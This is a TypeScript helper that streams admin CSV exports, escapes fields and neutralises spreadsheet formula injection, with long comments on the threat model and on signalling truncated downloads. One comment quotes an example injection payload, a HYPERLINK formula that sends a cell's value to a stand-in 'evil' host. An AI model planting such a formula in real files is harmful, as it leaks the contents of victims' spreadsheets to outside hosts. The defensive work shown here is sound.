import { Response } from "express";

/**
 * The single CSV helper every admin export (complaints/settlements/
 * merchants — modules/admin/admin-exports.controller.ts) reuses, so
 * escaping/streaming behavior lives in exactly one place. Task 9 brief:
 * "streaming, not buffered" — streamCsv never materializes the full
 * result set in memory; it pages through `fetchPage` (a bounded
 * skip/take query the caller owns) and writes each page's rows to the
 * response as it goes, so a large export's memory footprint is bounded by
 * `pageSize`, not by the total row count.
 */

// [Fix round, Important 6] CSV/formula injection: a cell whose value
// starts with =, +, -, @, a tab, or a carriage return is interpreted as
// a FORMULA by Excel/Google Sheets/LibreOffice when the file is opened —
// not just a display quirk, an actively executable payload (the classic
// example: `=HYPERLINK("http://evil/"&A1,"Click")`). These exports are
// the ETAHS/Ticaret Bakanlığı REGULATOR-FACING evidence trail, and every
// one of them includes at least one merchant/consumer-controlled free-
// text field (legalName/tradeName on merchants.csv, description on
// complaints.csv) — an admin opening the export in a spreadsheet app is
// exactly the threat model RFC 4180 escaping alone does nothing to
// address (quoting protects the CSV's own structure, not what the cell
// CONTENTS mean to a spreadsheet application).
const FORMULA_INJECTION_TRIGGER = /^[=+\-@\t\r]/;

/** RFC 4180 field escaping (wrap in quotes, doubling any embedded quote,
 * whenever the value contains a comma/quote/newline) PLUS formula-
 * injection neutralization: a leading =/+/-/@/tab/CR gets a single-quote
 * prefix first — Excel/Sheets' own standard defense, which renders the
 * cell as literal text (the leading apostrophe itself never displays).
 * Deliberately unconditional (a numeric -500 becomes literal text `-500`
 * too, not a real number a spreadsheet formula could sum) rather than
 * trying to special-case "this looks like a plain negative number" —
 * OWASP's own CSV-injection guidance recommends exactly this blanket
 * rule, since distinguishing a real negative number from a formula that
 * merely starts with digits is itself unreliable. Moot in practice for
 * every field these three exports actually carry: no Cents column here
 * is ever negative (settlement-math.ts's own invariants). */
export function csvEscapeField(
  value: string | number | null | undefined,
): string {
  if (value === null || value === undefined) return "";
  let str = String(value);
  if (FORMULA_INJECTION_TRIGGER.test(str)) {
    str = `'${str}`;
  }
  if (/[",\r\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

export function csvRow(
  fields: Array<string | number | null | undefined>,
): string {
  return fields.map(csvEscapeField).join(",") + "\r\n";
}

const DEFAULT_CSV_PAGE_SIZE = 500;

/**
 * Streams a CSV file to `res`: writes the header, then repeatedly calls
 * `fetchPage(skip, take)` and writes each returned row until a page comes
 * back shorter than `pageSize` (end of data). `res` must be the raw
 * Express response (`@Res({ passthrough: false })` in the controller) —
 * this function owns the response lifecycle end-to-end, including the
 * final `res.end()`.
 *
 * [Fix round, Minor] `res.setHeader`/`res.write` mean the 200 status and
 * CSV header row are already flushed to the client before the first
 * `fetchPage` call even resolves — by the time a LATER page's query
 * fails (a DB blip mid-export, a lock timeout, whatever), it is too late
 * to respond with a 500: the client already has `Content-Type: text/csv`
 * and some number of well-formed rows. Left unhandled, that rejection
 * used to propagate straight out of streamCsv with no final `res.end()`
 * ever called — depending on the client/proxy in front of it, that can
 * present as a hung request or, worse for the regulator-facing evidence
 * trail these three exports are, a response some intermediary eventually
 * closes in a way indistinguishable from a clean, complete file: a
 * SILENTLY TRUNCATED CSV an admin could submit to ETAHS believing it is
 * the full export. Fixed by catching the failure and calling
 * `res.destroy(error)`: this forcibly resets the underlying connection
 * instead of ending it cleanly, so any conforming HTTP client observes a
 * hard transport error (a `Transfer-Encoding: chunked` body missing its
 * terminating 0-length chunk) rather than a file that merely looks done.
 */
export async function streamCsv<T>(
  res: Response,
  filename: string,
  header: string[],
  fetchPage: (skip: number, take: number) => Promise<T[]>,
  toRow: (item: T) => Array<string | number | null | undefined>,
  pageSize: number = DEFAULT_CSV_PAGE_SIZE,
): Promise<void> {
  res.setHeader("Content-Type", "text/csv; charset=utf-8");
  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
  res.write(csvRow(header));

  try {
    let skip = 0;
    for (;;) {
      const page = await fetchPage(skip, pageSize);
      for (const item of page) {
        res.write(csvRow(toRow(item)));
      }
      if (page.length < pageSize) break;
      skip += page.length;
    }
  } catch (err) {
    res.destroy(err instanceof Error ? err : new Error(String(err)));
    return;
  }
  res.end();
}
